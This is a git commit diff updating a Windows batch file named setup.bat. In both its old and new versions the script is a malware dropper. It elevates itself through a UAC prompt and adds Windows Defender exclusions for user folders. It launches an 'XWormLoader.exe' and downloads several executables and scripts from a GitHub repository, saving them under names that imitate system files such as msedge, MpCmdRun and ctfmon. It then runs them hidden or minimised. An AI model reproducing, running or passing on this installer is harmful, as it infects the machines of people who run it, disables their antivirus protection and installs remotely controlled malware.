f8a518a404018797ff99415197c30a93ad8905dc
SszOnTop <155780283+SszOnTop@users.noreply.github.com>
2024-02-07 16:11:50 +0100

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,46 +1,21 @@
 @echo off
 
-:: BatchGotAdmin
-:-------------------------------------
-REM  --> Check for permissions
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-
-REM --> If error flag set, we do not have admin.
-if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
-    goto UACPrompt
-) else ( goto gotAdmin )
-
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params = %*:"=""
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
-
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-:--------------------------------------
-
-
-powershell Start-Process "XWormLoader.exe" -WindowStyle Hidden
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 
 powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
 powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/launcher.vbs' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launcher.vbs'"
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/ctfmon.exe' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\ctfmon.exe'"
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runfile.bat'"
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/Drivers.exe' -OutFile '%USERPROFILE%\DriversInitialisation.exe'"
+start /min "" "XWormLoader.exe"
 
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/msedge.exe' -OutFile '%USERPROFILE%\AppData\Roaming\msedgpe.exe'"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\run.bat'"
+powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/cmd.ps1' -OutFile '%USERPROFILE%\cmd.ps1'"
 
-powershell Start-Process "runfile.bat" -WindowStyle Hidden
-powershell Start-Process "launcher.vbs" -WindowStyle Hidden
+cd "%USERPROFILE%\AppData\Roaming\"
+start /min "" "msedge.exe"
 
-cd "%USERPROFILE%\AppData\Roaming\Microsoft"
-
-powershell Start-Process "ctfmon.exe"
+cd "%USERPROFILE%
+start /min "" "run.bat"
+powershell -file cmd.ps1
